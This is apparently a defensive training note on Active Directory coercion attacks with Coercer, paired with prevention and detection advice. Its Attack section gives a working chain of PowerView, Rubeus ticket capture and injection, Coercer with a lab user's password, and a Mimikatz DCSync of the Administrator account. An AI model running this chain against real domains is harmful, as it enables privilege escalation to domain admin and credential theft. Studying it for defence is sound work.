## Description

Coercing attacks have been a one-stop shop for escalating privileges from any user to Domain Administrator. Nearly every organization with a default AD infrastructure is vulnerable.
Any domain user can coerce RemoteServer$ to authenticate to any machine in the domain. Eventually, the [Coercer](https://github.com/p0dalirius/Coercer) tool was developed to exploit all known vulnerable RPC functions simultaneously.
Similar to [[Print Spooler & NTLM Relaying#Description]], an attacker can choose from several follow up options with the reverse connections.

## Attack

This time, we will abuse the second follow up, assuming that an attacker has gained administrative rights on a server configured for Unconstrained Delegation. This server will capture the TGT, while Coercer will be ran from the kali machine.
First, let's identify the systems configured for Unconstrained Delegation: `Get-NetComputer -Unconstrained | select samaccountname`.
Either _WS001\$_ or _SERVER01\$_ would be a target for an adversary. We have the first one with Bob, so let's start Rubeus to capture TGT.
```powershell
.\Rubeus.exe monitor /interval:1
```

Next, after finding the IP address of WS001, we can switch to the kali machine and execute Coercer towards DC1, while we force it to connect to WS001 if coercing is successful.
```bash
Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local
```

When we go back to the Windows machine, we should see a TGT for DC1 available. We can use it for authentications within the domain, becoming the Domain Controller. From there onwards, DCSync is an obvious attack.
One way of using the TGT is as follows: `.\Rubeus.exe ptt /ticket:doIFdDCCBXCgAwIBBa...`.
Then, a DCSync attack can be executed through Mimikatz: `.\mimikatz.exe "lsadump::dcsync /domain:eagle.local /user:Administrator"`

## Prevention

Windows does not offer control over RPC calls. There are however 2 different general approaches to preventing these attacks:
1. Implementing a third-party RPC firewall and use it to block dangerous RPC functions.
2. Block DCs and other core infrastructure servers from connecting to outbound ports 139 and 445, except those that are required for AD (cross DCs, for domain replication).

## Detection

The RPC Firewall from  [zero networks](https://github.com/zeronetworks/rpcfirewall) is an excellent method of detecting the abuse and can indicate immediate signs of compromise. However, if we don't want third-party software on DCs, then firewall logs are our best chance.
A successful coercing attack with Coercer will result in the following host firewall log, where .128 is the atacker and .200 is the DC.
![[Coercer-FirewallLogs.webp]]

If we go forward and block outbound traffic to ports 139 and 445, then we will see DROP'd packets regarding traffic to untrusted IPs/VLANs.
This DROPs can be used for detection, since any unexpected dropped traffic to those ports is suspicious.
